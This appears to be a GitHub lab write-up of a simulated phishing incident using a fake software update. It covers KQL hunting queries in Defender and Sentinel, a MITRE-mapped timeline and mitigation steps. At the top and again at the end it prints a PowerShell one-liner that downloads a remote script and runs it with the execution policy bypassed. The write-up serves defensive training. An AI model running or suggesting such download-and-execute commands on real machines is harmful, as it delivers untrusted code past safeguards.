

# 🚨 **Incident Response: Phishing via Fake Software Update** 🚨  

<img width="700*500" src="https://github.com/user-attachments/assets/e9d2fd77-dc9f-4faa-a735-925e1d3a25f0" alt="Tor Logo with the onion and a crosshair on it"/>

---

### 🛡️ **Scenario Overview**  
- **Organization**: 🏢 Medium-sized FinTech company.  
- **Threat**: Employees report unusual system behavior after clicking on a suspicious software update notification.  
- **Objective**: Identify the phishing campaign’s scope, mitigate its impact, and strengthen defenses.  

---

### 🌐 **PowerShell Payload (POC)**  

 
📥 **The PowerShell Payload**
Run the PowerShell command below on your VM **after onboarding it to MDE**:
```powershell
Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/TrevinoParker7/Powershell-test-payload-harmless/refs/heads/main/phishingFakeSoftwareUpdate.ps1' -OutFile 'C:\programdata\phishingFakeSoftwareUpdate.ps1';cmd /c powershell.exe -ExecutionPolicy Bypass -File C:\programdata\phishingFakeSoftwareUpdate.ps1
```

https://github.com/TrevinoParker7/Powershell-test-payload-harmless/blob/main/phishingFakeSoftwareUpdate.ps1

---

![Screenshot 2025-01-26 181108](https://github.com/user-attachments/assets/7b9ccc9f-e290-4125-8990-2e2de03d2d45)

![Screenshot 2025-01-26 130233](https://github.com/user-attachments/assets/e154a3c3-0a2f-4748-91af-0cc28bfa73a0)

---
### 💻 **Platforms and Tools Leveraged**  
- **SIEM**: Microsoft Sentinel  
- **Endpoint Protection**: Microsoft Defender for Endpoint  
- **Query Language**: Kusto Query Language (KQL)  
- **Infrastructure**: Windows 10 VMs on Microsoft Azure  

---

## 🕵️‍♂️ **High-Level IoC Discovery Plan**  
**Focus Areas**:  
1️⃣ Check **DeviceFileEvents** for suspicious file activities.  
2️⃣ Check **DeviceProcessEvents** for signs of malicious execution.  
3️⃣ Check **DeviceNetworkEvents** for outgoing connections, especially over known malicious ports.  

---

### 🔍 **KQL Queries**  

**Query: Recent File Events**  
```kql
DeviceFileEvents
| top 50 by Timestamp desc
```

**Query: Network Events**  
```kql
DeviceNetworkEvents
| top 50 by Timestamp desc
```

**Query: Process Events**  
```kql
DeviceProcessEvents
| top 50 by Timestamp desc
```

---

## 📊 **Threat Timeline**  

### 1️⃣ **File Download (Initial Access)**  
- **TTP**: [T1193](https://attack.mitre.org/techniques/T1193) - Spear Phishing Link  
- **Event**: Employees receive a phishing mimicking IT with a link to a "critical software update."  
- **Impact**: The link leads to downloading a PowerShell payload.  

**Relevant Query**:  
```kql
DeviceFileEvents
| where DeviceName == "tphish"
| where FileName endswith "ps1"
| order by Timestamp desc 
```
![Screenshot 2025-01-26 131545](https://github.com/user-attachments/assets/0f60aaaa-fc7c-456e-8680-5a2a3d7ed5db)
---

### 2️⃣ **Process Execution**  
- **TTP**: [T1059.001](https://attack.mitre.org/techniques/T1059/001) - PowerShell Execution  
- **Event**: Malicious PowerShell script execution on victim devices.  
- **Query Used**:  
```kql
let VMName = "tphish";
let specificTime = datetime(2025-01-26T19:01:29.0367754Z);
DeviceProcessEvents
| where Timestamp between ((specificTime - 2m) .. (specificTime + 2m))
| where DeviceName == VMName
| order by Timestamp desc
```

![Screenshot 2025-01-26 133010](https://github.com/user-attachments/assets/31b64c99-ad4f-48c1-b89f-ff5a34d5962f)

---

```kql
DeviceProcessEvents
| where FileName == "powershell.exe"
| where ProcessCommandLine contains "phishingFakeSoftwareUpdate.ps1" or ProcessCommandLine contains "Add-Type -AssemblyName PresentationFramework"
| extend Timestamp = Timestamp, InitiatingProcessAccountName = InitiatingProcessAccountName
| project Timestamp, DeviceName, FileName, ProcessCommandLine, InitiatingProcessAccountName, InitiatingProcessCommandLine
| order by Timestamp desc
```
![Screenshot 2025-01-26 134312](https://github.com/user-attachments/assets/31820b28-e89e-4e42-9ea5-24060e2a7508)

---


### 3️⃣ **Network Connection to C2 Server**  
- **TTP**: [T1071.001](https://attack.mitre.org/techniques/T1071/001) - Web Protocols  
- **Event**: Communication with a C2 server over the internet, potentially exfiltrating credentials.  
- **Query Used**:  
```kql
union DeviceNetworkEvents, DeviceProcessEvents
| where Timestamp > ago(6h)
| where RemoteUrl contains "raw.githubusercontent.com" or InitiatingProcessCommandLine has "phishingFakeSoftwareUpdate.ps1"
| project Timestamp, DeviceName, RemoteUrl, RemoteIP, InitiatingProcessCommandLine, FileName, FolderPath, ActionType
| order by Timestamp desc
```
![Screenshot 2025-01-26 140306](https://github.com/user-attachments/assets/f41a1d4e-246e-4ca1-9053-5a0630777595)

---

### 4️⃣ **Lateral Movement & Credential Dumping**  
- **TTPs**:  
  - [T1210](https://attack.mitre.org/techniques/T1210) - Exploitation of Remote Services  

---

## 🛠️ **Mitigation Steps**  

### 🔒 Containment  
1️⃣ Block the malicious domain on the firewall and DNS servers.  
2️⃣ Disable compromised user accounts and enforce password resets.  
3️⃣ Isolate infected machines from the network.  

### 🧹 Eradication  
1️⃣ Deploy updated antivirus signatures to detect and remove the malware.  
2️⃣ Conduct system-wide scans using EDR tools.  

### 🔄 Recovery  
1️⃣ Restore affected systems from backups.  
2️⃣ Re-enable user access after ensuring systems are clean.  

---

## 🧠 **Post-Incident Improvements**  

### 🚀 Proactive Monitoring  
- Enhanced SIEM rules for detecting phishing emails.  
- Integration of threat intelligence feeds to block new malicious domains.
- Create a Rule to detect this. 

### 📚 User Awareness  
- Mandatory phishing training with simulation tests.  
- Quick-reference phishing awareness guide shared via email.  

---

### 📈 **Mapped TTPs to MITRE ATT&CK Framework**  

| Tactic             | Technique                             | ID        | Example                             |  
|---------------------|---------------------------------------|-----------|-------------------------------------|  
| **Initial Access**  | Spear Phishing Link                  | T1193     | Phishing email with fake update link |  
| **Execution**       | PowerShell Execution                 | T1059.001 | Malicious PowerShell script executed |  
| **Command & Control** | Web Protocols                     | T1071.001 | C2 communication to exfiltrate data |  
| **Credential Access** | Credentials in Files              | T1555.003 | Stolen credentials from payload use |  
| **Lateral Movement**  | Exploitation of Remote Services    | T1210     | Attempts to pivot to other devices  |  

---

### 📥**PowerShell Payload (POC)**  

Run the PowerShell command below on your VM **after onboarding it to MDE**:
```powershell
Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/TrevinoParker7/Powershell-test-payload-harmless/refs/heads/main/phishingFakeSoftwareUpdate.ps1' -OutFile 'C:\programdata\phishingFakeSoftwareUpdate.ps1';cmd /c powershell.exe -ExecutionPolicy Bypass -File C:\programdata\phishingFakeSoftwareUpdate.ps1
```

https://github.com/TrevinoParker7/Powershell-test-payload-harmless/blob/main/phishingFakeSoftwareUpdate.ps1

---

